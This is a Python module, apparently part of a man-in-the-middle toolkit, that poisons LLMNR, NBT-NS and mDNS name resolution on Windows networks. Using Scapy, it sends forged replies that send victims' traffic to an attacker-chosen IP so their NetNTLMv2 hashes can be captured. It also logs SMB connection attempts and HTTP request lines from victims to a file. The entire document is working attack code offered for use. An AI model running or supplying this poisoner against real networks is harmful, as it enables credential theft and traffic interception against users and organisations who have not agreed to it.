"""
LLMNR / NBT-NS / mDNS Poisoning Module
Responds to multicast name resolution queries to capture NetNTLMv2 hashes
or redirect traffic on Windows networks.

LLMNR (Link-Local Multicast Name Resolution) - UDP 5355
NBT-NS (NetBIOS Name Service) - UDP 137
mDNS (Multicast DNS) - UDP 5353

This is extremely effective on Windows networks where DNS fails to resolve.
"""
import os
import re
import threading
import time
from collections import defaultdict
from datetime import datetime

try:
    from scapy.all import (
        IP, TCP, UDP, Raw, DNS, DNSQR, DNSRR,
        NBNSQueryRequest, NBNSQueryResponse,
        Ether, sniff, sendp, conf
    )
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False


# --------------- Configuration ---------------
_running = False
_threads: list[threading.Thread] = []
_stats = defaultdict(int)
_capture_dir = "captures"

# Responder address - the IP we tell victims to connect to
_responder_ip: str = ""

# Redirect rules for LLMNR/mDNS (domain -> IP)
_redirect_rules: dict[str, str] = {}

# Output file for captured hashes
_output_file: str | None = None


def configure(responder_ip: str, output_file: str = "captures/hashes.txt"):
    """Configure the LLMNR poisoner."""
    global _responder_ip, _output_file, _capture_dir
    _responder_ip = responder_ip
    _output_file = output_file
    _capture_dir = os.path.dirname(output_file) if output_file else "captures"

    # Create capture directory
    if not os.path.exists(_capture_dir):
        os.makedirs(_capture_dir, exist_ok=True)


def add_redirect(domain: str, target_ip: str):
    """Add a redirect rule for LLMNR/mDNS responses."""
    _redirect_rules[domain.lower()] = target_ip
    print(f"  [+] LLMNR redirect: {domain} -> {target_ip}")


# --------------- LLMNR Handler (UDP 5355) ---------------
def _llmnr_handler(packet):
    """Handle LLMNR queries."""
    global _stats

    if not packet.haslayer(Ether) or not packet.haslayer(IP) or not packet.haslayer(UDP):
        return
    if not packet.haslayer(DNS) or not packet.haslayer(DNSQR):
        return

    dns = packet[DNS]
    if dns.qr != 0:  # Not a query
        return

    qname = packet[DNSQR].qname.decode("utf-8", errors="ignore").rstrip(".")
    qtype = packet[DNSQR].qtype

    # Only handle A (1) and AAAA (28) queries
    if qtype not in (1, 28):
        return

    _stats["llmnr_queries"] += 1
    print(f"\n  [LLMNR] Query from {packet[IP].src}: {qname}")

    # Check for redirect rule
    redirect_ip = _redirect_rules.get(qname.lower(), _responder_ip)

    try:
        # Build LLMNR response
        eth = packet[Ether]
        orig_ip = packet[IP]
        orig_udp = packet[UDP]

        rrdata = redirect_ip
        rrtype = "A"
        if qtype == 28:
            rrtype = "AAAA"
            rrdata = "::1"  # Localhost IPv6

        response = (
            Ether(src=eth.dst, dst=eth.src) /
            IP(src=orig_ip.dst, dst=orig_ip.src) /
            UDP(sport=5355, dport=orig_udp.sport) /
            DNS(
                id=dns.id,
                qr=1, aa=1, rd=dns.rd, ra=0,
                qdcount=1, ancount=1,
                qd=dns[DNSQR],
                an=DNSRR(
                    rrname=packet[DNSQR].qname,
                    type=rrtype,
                    rdata=rrdata,
                    ttl=30,
                ),
            )
        )

        sendp(response, verbose=0, iface=eth.sniffed_on if hasattr(eth, 'sniffed_on') else conf.iface)
        _stats["llmnr_responses"] += 1
        print(f"  [LLMNR] Responded: {qname} -> {redirect_ip}")

    except Exception as e:
        _stats["errors"] += 1


# --------------- NBT-NS Handler (UDP 137) ---------------
def _nbns_handler(packet):
    """Handle NetBIOS Name Service queries."""
    global _stats

    if not packet.haslayer(Ether) or not packet.haslayer(IP) or not packet.haslayer(UDP):
        return
    if not packet.haslayer(NBNSQueryRequest):
        return

    nbns = packet[NBNSQueryRequest]
    name = nbns.QUESTION_NAME.decode("utf-8", errors="ignore").strip().rstrip("\x00")
    # Clean the NetBIOS-encoded name
    name = re.sub(r"[^\x20-\x7e]", "", name)
    if not name:
        return

    _stats["nbns_queries"] += 1
    print(f"\n  [NBT-NS] Query from {packet[IP].src}: {name}")

    try:
        eth = packet[Ether]
        orig_ip = packet[IP]
        orig_udp = packet[UDP]

        # Build NBNS response pointing to our IP
        response = (
            Ether(src=eth.dst, dst=eth.src) /
            IP(src=orig_ip.dst, dst=orig_ip.src) /
            UDP(sport=137, dport=orig_udp.sport) /
            NBNSQueryResponse(
                NAME_TRN_ID=nbns.NAME_TRN_ID,
                RESPONSE=True,
                OPCODE=0,
                NM_FLAGS=0,
                RCODE=0,
                QDCOUNT=0,
                ANCOUNT=1,
                NSCOUNT=0,
                ARCOUNT=0,
                QUESTION_NAME=nbns.QUESTION_NAME,
                RR_NAME=nbns.QUESTION_NAME,
                NB_ADDRESS=_responder_ip,
                NB_FLAGS=0x6000,  # H-Node, unique
                NB_TYPE=0x00,     # Workstation
                NB_CLASS=0x01,
                TTL=165,
            )
        )

        sendp(response, verbose=0, iface=eth.sniffed_on if hasattr(eth, 'sniffed_on') else conf.iface)
        _stats["nbns_responses"] += 1
        print(f"  [NBT-NS] Responded: {name} -> {_responder_ip}")

    except Exception as e:
        _stats["errors"] += 1


# --------------- mDNS Handler (UDP 5353) ---------------
def _mdns_handler(packet):
    """Handle mDNS queries."""
    global _stats

    if not packet.haslayer(Ether) or not packet.haslayer(IP) or not packet.haslayer(UDP):
        return
    if not packet.haslayer(DNS):
        return

    dns = packet[DNS]
    if dns.qr != 0:
        return
    if not packet.haslayer(DNSQR):
        return

    qname = packet[DNSQR].qname.decode("utf-8", errors="ignore").rstrip(".")
    qtype = packet[DNSQR].qtype

    if qtype not in (1, 28):
        return

    # Only respond if we have a redirect rule
    redirect_ip = _redirect_rules.get(qname.lower())
    if redirect_ip is None:
        return

    _stats["mdns_queries"] += 1
    print(f"\n  [mDNS] Query from {packet[IP].src}: {qname}")

    try:
        eth = packet[Ether]
        orig_ip = packet[IP]
        orig_udp = packet[UDP]

        rrtype = "A"
        rrdata = redirect_ip
        if qtype == 28:
            rrtype = "AAAA"
            rrdata = "::1"

        response = (
            Ether(src=eth.dst, dst=eth.src) /
            IP(src=orig_ip.dst, dst=orig_ip.src) /
            UDP(sport=5353, dport=orig_udp.sport) /
            DNS(
                id=dns.id,
                qr=1, aa=1,
                qdcount=1, ancount=1,
                qd=dns[DNSQR],
                an=DNSRR(
                    rrname=packet[DNSQR].qname,
                    type=rrtype,
                    rdata=rrdata,
                    ttl=30,
                ),
            )
        )

        sendp(response, verbose=0, iface=eth.sniffed_on if hasattr(eth, 'sniffed_on') else conf.iface)
        _stats["mdns_responses"] += 1
        print(f"  [mDNS] Responded: {qname} -> {redirect_ip}")

    except Exception as e:
        _stats["errors"] += 1


# --------------- SMB Hash Capture ---------------
def _smb_handler(packet):
    """Sniff for incoming SMB connections and log hash attempts."""
    if not packet.haslayer(IP) or not packet.haslayer(TCP):
        return

    tcp = packet[TCP]

    # Only capture SYN packets to port 445 (SMB)
    if tcp.dport == 445 and tcp.flags & 0x02:
        src_ip = packet[IP].src
        _stats["smb_connections"] += 1
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        msg = f"[{timestamp}] SMB connection from {src_ip} (potential hash capture)"
        print(f"\n  [SMB] {msg}")
        _log_capture(msg)


# --------------- HTTP Server for WPAD capture ---------------
def _http_handler(packet):
    """Sniff for HTTP requests (WPAD, etc.) and log them."""
    if not packet.haslayer(IP) or not packet.haslayer(TCP):
        return
    if not packet.haslayer(Raw):
        return

    tcp = packet[TCP]
    if tcp.dport == 80 and tcp.flags & 0x18:  # PSH+ACK (data-bearing packet)
        src_ip = packet[IP].src
        try:
            payload = bytes(packet[Raw].load)
            if payload and b"GET " in payload:
                request_line = payload.split(b"\r\n")[0].decode("utf-8", errors="ignore")
                _stats["http_requests"] += 1
                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                msg = f"[{timestamp}] HTTP {src_ip}: {request_line}"
                print(f"\n  [HTTP] {msg}")
                _log_capture(msg)
        except Exception:
            pass


def _log_capture(msg: str):
    """Write capture log to file."""
    if _output_file:
        try:
            with open(_output_file, "a", encoding="utf-8") as f:
                f.write(msg + "\n")
        except Exception:
            pass


# --------------- Start / Stop ---------------
def start_spoof(interface: str | None = None):
    """Start LLMNR/NBT-NS/mDNS poisoning."""
    global _running, _threads

    if not SCAPY_AVAILABLE:
        print("[!] Scapy is not installed.")
        return False

    if not _responder_ip:
        print("[!] Configure with responder IP first using configure()")
        return False

    if _running:
        print("[!] Already running.")
        return False

    _running = True
    _stats.clear()

    print(f"\n[*] Starting LLMNR/NBT-NS/mDNS poisoner")
    print(f"[*] Responder IP: {_responder_ip}")
    print(f"[*] Listening on UDP 5355 (LLMNR), 137 (NBT-NS), 5353 (mDNS)")
    if _redirect_rules:
        print(f"[*] Redirect rules: {len(_redirect_rules)}")
    if _output_file:
        print(f"[*] Captures: {_output_file}")
    print()

    # LLMNR sniffer (UDP 5355)
    def llmnr_sniffer():
        sniff(
            filter="udp port 5355",
            prn=_llmnr_handler,
            store=0,
            stop_filter=lambda p: not _running,
            iface=interface,
        )

    # NBT-NS sniffer (UDP 137)
    def nbns_sniffer():
        sniff(
            filter="udp port 137",
            prn=_nbns_handler,
            store=0,
            stop_filter=lambda p: not _running,
            iface=interface,
        )

    # mDNS sniffer (UDP 5353)
    def mdns_sniffer():
        sniff(
            filter="udp port 5353",
            prn=_mdns_handler,
            store=0,
            stop_filter=lambda p: not _running,
            iface=interface,
        )

    # SMB sniffer (TCP 445)
    def smb_sniffer():
        sniff(
            filter="tcp port 445",
            prn=_smb_handler,
            store=0,
            stop_filter=lambda p: not _running,
            iface=interface,
        )

    # HTTP sniffer (TCP 80)
    def http_sniffer():
        sniff(
            filter="tcp port 80",
            prn=_http_handler,
            store=0,
            stop_filter=lambda p: not _running,
            iface=interface,
        )

    _threads = []
    for target in [llmnr_sniffer, nbns_sniffer, mdns_sniffer, smb_sniffer, http_sniffer]:
        t = threading.Thread(target=target, daemon=True)
        t.start()
        _threads.append(t)

    print("[✓] LLMNR/NBT-NS/mDNS poisoning active")
    print("[*] Waiting for broadcast name resolution queries...\n")
    return True


def stop_spoof():
    """Stop all poisoning."""
    global _running, _threads

    if not _running:
        return

    print("\n[*] Stopping LLMNR/NBT-NS poisoner...")
    _running = False

    for t in _threads:
        t.join(timeout=3.0)
    _threads.clear()

    print(f"[*] Stats:")
    print(f"    LLMNR: {_stats['llmnr_queries']} queries, {_stats['llmnr_responses']} responses")
    print(f"    NBT-NS: {_stats['nbns_queries']} queries, {_stats['nbns_responses']} responses")
    print(f"    mDNS:   {_stats['mdns_queries']} queries, {_stats['mdns_responses']} responses")
    print(f"    SMB:    {_stats['smb_connections']} connections")
    print(f"    HTTP:   {_stats['http_requests']} requests")
    print(f"    Errors: {_stats['errors']}")
    print("[✓] Poisoner stopped\n")


def is_spoofing() -> bool:
    return _running


if __name__ == "__main__":
    print("LLMNR/NBT-NS Poison module - import and use from mitm_app.py")
